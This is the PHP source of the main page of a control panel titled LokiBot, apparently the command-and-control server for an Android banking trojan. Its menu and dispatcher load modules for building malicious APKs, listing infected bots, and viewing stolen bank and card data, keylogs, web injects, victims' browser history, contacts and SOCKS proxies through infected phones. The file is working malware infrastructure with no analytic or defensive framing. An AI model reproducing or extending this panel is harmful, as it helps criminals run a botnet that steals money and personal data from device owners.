<?php session_start();

if (!(isset($_SESSION['user_id']))){
  header("Location: ../index.php");  
  return;
}  
?>
<!doctype html>

<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>LokiBot</title>

    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="images/android-desktop.png">

    <!-- Add to homescreen for Safari on iOS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="images/ios-desktop.png">

    <!-- Tile icon for Win8 (144x144 + tile color) -->
    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

    <script src="js/scripts.js"></script>

    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.indigo-pink.min.css">
    <script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
    <link rel="shortcut icon" href="images/favicon.png">

    <!---->
    <link href="styles/btn.css" rel="stylesheet"/>
    <link rel="stylesheet" href="styles/styles.css">
    <link rel="stylesheet" href="styles/style.css"/>
    <link href="styles/modul_form_log.css" rel="stylesheet"/>
    <link href="styles/modul_form.css" rel="stylesheet"/>
    <link href="styles/index.css" rel="stylesheet"/>

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    
    <style>
      #view-source {
        position: fixed;
        display: block;
        right: 0;
        bottom: 0;
        margin-right: 40px;
        margin-bottom: 40px;
        z-index: 900;
      }
      a { 
      text-decoration: none;
     } 
    </style>
  </head>
  <body>
 <div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
  <header class="mdl-layout__header"  style="background: black; color: white;">
    <div class="mdl-layout__header-row">
      <!-- Title -->
      <i class="mdl-color-text--blue-grey-400 material-icons">explore</i>
      <span class="mdl-layout-title">LokiBot</span>
      <!-- Add spacer, to align navigation to the right -->
      <div class="mdl-layout-spacer"></div>
      <!-- Navigation. We hide it in small screens. -->
      <nav class="mdl-navigation mdl-layout--large-screen-only">
          <a style="color: white;" class="mdl-navigation__link" href="?command=bots_online"><div id="topnav_statistic" class="mdl-color-text--blue-grey-400 icon material-icons">trending_up</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=build_apk"><div id="topnav_build_apk" class="mdl-color-text--blue-grey-400 material-icons">build</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=Install apk"><div id="topnav_install_apk" class="mdl-color-text--blue-grey-400 material-icons">today</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=botlist&sort=lastConnect"><div id="topnav_all_bots" class="mdl-color-text--blue-grey-400 material-icons">android</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=bank"><div id="topnav_bank" class="mdl-color-text--blue-grey-400 material-icons">account_balance</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=card"><div id="topnav_card" class="mdl-color-text--blue-grey-400 material-icons">payment</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=injlist"><div id="topnav_injlist" class="mdl-color-text--blue-grey-400 material-icons">delete</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=commlist"><div id="topnav_commlist" class="mdl-color-text--blue-grey-400 material-icons">toc</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=bot_logs"><div id="topnav_bot_logs" class="mdl-color-text--blue-grey-400 material-icons">speaker_notes</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=bot_hist"><div id="topnav_bot_hist" class="mdl-color-text--blue-grey-400 material-icons">history</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=socks"><div id="topnav_socks" class="mdl-color-text--blue-grey-400 material-icons">vpn_lock</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=contacts"><div id="topnav_contacts" class="mdl-color-text--blue-grey-400 material-icons">people</div></a>
          <a style="color: white;" class="mdl-navigation__link" href="?command=settings"><div id="topnav_settings" class="mdl-color-text--blue-grey-400 material-icons">settings</div></a>
<button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
           <center><li><a href="logout.php">Logout</a></li></center>
     
          </ul>
      </nav>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_statistic">Statistic</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_build_apk">Build apk</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_install_apk">Install apk</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_all_bots">All Bots</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_bank">Bank</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_card">Card</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_injlist">Inject list</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_commlist">Commnds list</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_bot_logs">Bot logs</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_bot_hist">Bots browser history</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_socks">Socks</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_contacts">Contacts</div>
      <div class="mdl-tooltip mdl-tooltip--large" for="topnav_settings">Settings</div>
    </div>
  </header>
  <div class="mdl-layout__drawer">
    <span class="mdl-layout-title">Main menu</span>
    <nav class="mdl-navigation">
      <a class="mdl-navigation__link" href="?command=bots_online"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">trending_up</i>Statistic</a>
      <a class="mdl-navigation__link" href="?command=build_apk"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">build</i>Build apk</a>
      <a class="mdl-navigation__link" href="?command=Install apk"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">today</i>Install apk</a>
      <a class="mdl-navigation__link" href="?command=botlist&sort=lastConnect"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">android</i>All Bots</a>
      <a class="mdl-navigation__link" href="?command=bank"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">account_balance</i>Bank</a>
      <a class="mdl-navigation__link" href="?command=card"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">payment</i>Card</a>
      <a class="mdl-navigation__link" href="?command=injlist"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">delete</i>Inject List</a>
      <a class="mdl-navigation__link" href="?command=commlist"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">toc</i>Commands List</a>
      <a class="mdl-navigation__link" href="?command=bot_logs"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">speaker_notes</i>Bot logs</a>
      <a class="mdl-navigation__link" href="?command=bot_hist"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">history</i>Bots browser history</a>
      <a class="mdl-navigation__link" href="?command=socks"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">vpn_lock</i>Socks</a>
      <a class="mdl-navigation__link" href="?command=contacts"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">people</i>Contacts</a>
      <a class="mdl-navigation__link" href="?command=settings"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">settings</i>Settings</a>

      <!--<label id="wide-label" class="mdl-navigation__link mdl-switch mdl-js-switch mdl-js-ripple-effect" for="wide-mode">
        <input type="checkbox" id="wide-mode" class="mdl-switch__input" onchange="wide_mode()" 
<?php if ($_SESSION["wide-mode"] == "true") echo "checked"; ?>
        >
        <span class="mdl-switch__label" style="top: -15px;">Wide mode</span>
      </label>-->
    </nav>
  </div>
  
  <main class="mdl-layout__content">
      
<?php 

if (isset($_SESSION["wide-mode"]) and ($_SESSION["wide-mode"] == "true")){
  $wide_tag = '';
} else {
  $wide_tag = 'demo-content';
}

if ($_GET['command'] == 'bots_online'){
    echo("<div id='task'  class='mdl-grid demo-content'>");
    include "botsonline.php";
    echo('</div>');
}
if ($_GET['command'] == 'Install apk'){
    echo("<div id='Install apk' class='mdl-grid demo-content'>");
    include "tasks.php";
    echo('</div>');
}
if ($_GET['command'] == 'filesize'){
    echo("<div id='botlist' class='mdl-grid demo-content'>");
    include "filesize.php";
    echo('</div>');
}
if ($_GET['command'] == 'botlist'){
    echo("<div id='botlist' class='mdl-grid $wide_tag'>");
    include "botlist.php";
    echo('</div>');
}
if ($_GET['command'] == 'bank'){
    echo("<div id='bank' class='mdl-grid $wide_tag'>");
    include "bank.php";
    echo('</div>');
}
if ($_GET['command'] == 'card'){
    echo("<div id='card' class='mdl-grid $wide_tag'>");
    include "card.php";
    echo('</div>');
}
if ($_GET['command'] == 'keylog'){
    echo("<div id='card' class='mdl-grid $wide_tag'>");
    include "keylog.php";
    echo('</div>');
}
if ($_GET['command'] == 'injlist'){
    echo("<div id='card' class='mdl-grid $wide_tag'>");
    include "injectlist.php";
    echo('</div>');
}
if ($_GET['command'] == 'commlist'){
    echo("<div id='card' class='mdl-grid $wide_tag'>");
    include "commandslist.php";
    echo('</div>');
}
if ($_GET['command'] == 'bot_logs'){
    echo("<div id='card' class='mdl-grid $wide_tag'>");
    include "bot_logs.php";
    echo('</div>');
}
if ($_GET['command'] == 'bot_hist'){
    echo("<div id='card' class='mdl-grid $wide_tag'>");
    include "bot_hist.php";
    echo('</div>');
}
if ($_GET['command'] == 'socks'){
    echo("<div id='card' class='mdl-grid $wide_tag'>");
    include "socks.php";
    echo('</div>');
}
if ($_GET['command'] == 'contacts'){
  echo("<div id='contacts' class='mdl-grid demo-content'>");
  include "contacts.php";
  echo('</div>');
}
if ($_GET['command'] == 'settings'){
  echo("<div id='settings' class='mdl-grid demo-content'>");
  include "settings.php";
  echo('</div>');
}
if ($_GET['command'] == 'build_apk'){
    echo("<div id='Build_apk' class='mdl-grid demo-content'>");
    include "build.php";
    echo('</div>');
}


?>    
      </main>

    </div>
    <div id="demo-toast-example" class="mdl-js-snackbar mdl-snackbar">
      <div class="mdl-snackbar__text"></div>
      <button class="mdl-snackbar__action" type="button"></button>
    </div>
  </body>
</html>
